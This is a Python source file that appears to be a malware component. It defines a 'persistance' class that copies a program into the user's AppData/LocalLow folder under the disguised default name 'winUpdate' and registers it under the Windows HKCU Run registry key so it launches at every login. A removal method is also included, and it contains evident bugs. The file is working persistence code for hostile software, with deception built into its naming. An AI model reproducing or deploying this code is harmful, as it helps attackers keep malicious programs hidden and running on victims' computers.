# -*- coding: utf-8 -*-
"""
Created on Fri Jul 13 22:48:37 2018

@author: toto
"""

import os 
import winreg as wreg 
import shutil

class persistance : 
    def __init__(self , programPath ,  programName = "winUpdate" ):
        self.userProfile = os.path.expanduser("~").replace("\\","/").strip("\n")
        self.programName = programName 
        
        self.destination =  self.userProfile + "/AppData/LocalLow/" + self.programName
        
        self.path = programPath
        self.isActive = os.path.exists(self.destination)
        
    
    def installPersistance(self):
        
        if self.isActive == True or  os.path.exists(self.destination) :
            self.isActive = True
            return "[*] Persistance already installed !!"
        else:
            try : 
                if not  os.path.exists(self.destination):
                    shutil.copyfile(self.path +"/" +  self.programName , self.destination)
            except Exception as e : 
                return "[-] Error while copying the file into :" +  self.destination +" -> " + e
            
            destination = self.destination.replace("/" , "\\")
            destination = '"' + destination +'"'
            
            try :     
                key = wreg.OpenKey(wreg.HKEY_CURRENT_USER , "Software\Microsoft\Windows\CurrentVersion\Run" , 0, wreg.KEY_ALL_ACCESS)
                wreg.SetValueEx(key , self.programName.strip(".exe") , 0 , wreg.REG_SZ, self.destination)
                key.Close()
                self.isActive = True
            except Exception as e :
                os.remove(self.destination)
                return "Error while creating the key  --> "+ e 
            
                
            return "[+] Persistance succesfully installed !!"                                           
    
    def removePersistance(self):
        
        if self.isActive ==False :
            return "[*] Peristance is not installed "
        else:
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER , "Software\Microsoft\Windows\CurrentVersion\Run" , 0, wreg.KEY_ALL_ACCESS)
            wreg.DeleteValue(self.key , self.programName.strip(".exe"))
            key.close()
            self.isActive = True 
            return "[+] Persistance successfully removed " 
        
                
            